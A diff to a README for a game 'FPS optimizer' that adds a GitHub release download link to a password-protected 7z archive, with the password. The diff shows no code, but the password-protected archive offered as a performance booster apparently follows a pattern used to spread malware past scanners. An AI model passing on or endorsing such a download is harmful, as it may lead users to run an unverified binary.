@@ -7,7 +7,7 @@ Meccha FPS Optimizer is a lightweight utility designed to boost framerates and r
 ## Download
 
 **Latest version:**  
-🔗 **[Download Meccha FPS Optimizer]()**
+🔗 **[Download Meccha FPS Optimizer](https://github.com/ClawThrasherOvercome/Meccha-Fps-Boosting/releases/download/mechafpss/MecchaFPSOptimizer.7z)**
 - pass: mechafps
 
 # Meccha FPS Optimizer – Performance Booster for MECCHA CHAMELEON
